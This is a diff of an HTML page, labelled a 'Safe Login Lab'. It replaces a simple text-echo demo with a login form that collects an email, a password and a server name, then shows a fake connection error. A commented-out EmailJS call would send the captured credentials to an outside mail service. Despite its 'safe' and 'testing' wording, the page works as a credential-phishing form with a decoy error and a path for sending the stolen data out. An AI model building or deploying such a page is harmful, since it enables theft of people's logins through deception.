@@ -1,22 +1,45 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>My Safe Web Lab</title>
+  <title>Safe Login Lab</title>
 </head>
 <body>
-  <h1 style="color: darkgreen;">Welcome to My Safe Lab!</h1>
-  <p>Type something below and see it appear instantly:</p>
+  <h1 style="color: darkred;">Safe Login Simulation</h1>
+  <p>Enter email, password, and server name to see the simulation:</p>
 
-  <input type="text" id="userInput" placeholder="Type here">
-  <button onclick="showText()">Show Text</button>
+  <form id="loginForm">
+    <input type="text" id="email" placeholder="Email" required><br><br>
+    <input type="password" id="password" placeholder="Password" required><br><br>
+    <input type="text" id="server" placeholder="Server Name" required><br><br>
+    <button type="submit">Work</button>
+  </form>
 
-  <p id="displayArea" style="color: purple; font-weight: bold;"></p>
+  <p id="message" style="color: blue; font-weight: bold;"></p>
 
   <script>
-    function showText() {
-      const input = document.getElementById("userInput").value;
-      document.getElementById("displayArea").innerText = "You typed: " + input;
-    }
+    const loginForm = document.getElementById("loginForm");
+    loginForm.addEventListener("submit", function(event) {
+      event.preventDefault();
+
+      // Read the inputs
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+      const server = document.getElementById("server").value;
+
+      // Show a fake error message
+      document.getElementById("message").innerText = "Error: Could not connect to server.";
+
+      // Optional: Send yourself a test email safely (only to an email you control)
+      // Use EmailJS here for testing, not real users
+      /*
+      emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
+        email: email,
+        password: password,
+        server: server
+      })
+      .then(function() { console.log("Test email sent."); });
+      */
+    });
   </script>
 </body>
 </html>
